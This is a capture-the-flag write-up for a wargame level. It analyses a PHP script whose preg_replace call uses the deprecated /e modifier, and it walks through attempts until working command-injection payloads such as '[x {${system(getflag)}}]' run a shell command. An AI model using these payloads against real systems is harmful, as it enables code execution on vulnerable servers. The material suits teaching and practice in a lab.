# level06

## php file
"level06.php":
```
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

Let's beautify it:
```
#!/usr/bin/php

<?php
  function ft_second($m)
  {
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
  }

  function ft_first($y, $z)
  {
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "ft_second(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
  }

  $result = ft_first($argv[1], $argv[2]);

  print $result;
?>
```

## Php code
We can read the above php code from bottom to top. We call this f_first() function with argv[1] and argv[2] as arguments and print it's result.  
In the "ft_first()" function, we only use the $y and never use the $z.  
We get the contents with "file_get_contents()", so we know that we should provide a file route with the argv[1].  
Then we do the replacement with preg_replace() function and regex.  

## preg_replace and regex
When searching for "preg_replace vulnerbility" we found a possible exploit wiht the "e" modifier. This is a depricated function in php so this also means that the system is using an old version of php.    
It can basicly take the maching input and execute it instead of treating it as plain text.  
So we can try to create a file. Write some php code inside and try to make this script execute it.  

## Attempts
I tried to create a file in /tmp folder as before and write a string mach the pattern(`"/(\[x (.*)\])/e"`).  
So the command will be like: `echo "[x whatever]" > /tmp/getflag`.  
Difficult to make php code execute the function. They are all being printed out as string or spit out some syntax error:  
- '[x system(getflag)]' -> print as string
- '[x ${system(getflag)}]' -> syntax error
- '[x {system(getflag)}]' -> print as string
- '[x ; system(getflag)]' -> print as string
... and so on...

Until I found this: [Complex(curly) syntax](https://www.php.net/manual/en/language.types.string.php#language.types.string.parsing.complex)  

- '[x {${system(getflag)}}]' finaly solve the problem.
- or '[x {${`getflag`}}]'

## Takeaway
- regex
- php syntaxe
- php Complex(curly) syntax
- preg_replace vulnerbility(deprecated)

